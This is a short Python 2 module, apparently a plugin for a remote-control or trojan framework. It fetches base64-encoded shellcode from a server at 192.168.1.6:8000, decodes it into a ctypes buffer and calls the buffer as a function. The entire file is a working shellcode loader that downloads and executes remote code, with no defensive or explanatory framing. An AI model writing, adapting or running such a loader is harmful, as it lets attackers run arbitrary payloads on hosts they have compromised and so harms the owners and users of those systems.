def run(**args):
	try:
		import urllib2
		import ctypes
		import base64
	except:
		print "Could not load the module on this host. Skipping."
		return 0, "failed"
	try:
		url = "http://192.168.1.6:8000/shellcode.bin"
		response = urllib2.urlopen(url)
		shellcode = base64.b64decode(response.read())
	except:
		print "There was a problem while trying to grab the code from the server, exiting module..."
		return 0, "failed"
	try:
		shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
		shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
		shellcode_func()
	except Exception as Ex:
		print "Could not run the shell. Exception occured: %s " % Ex
		return 0, "failed"
	print "Shellcode executed."
	return 0, "successfully"
	
	
	
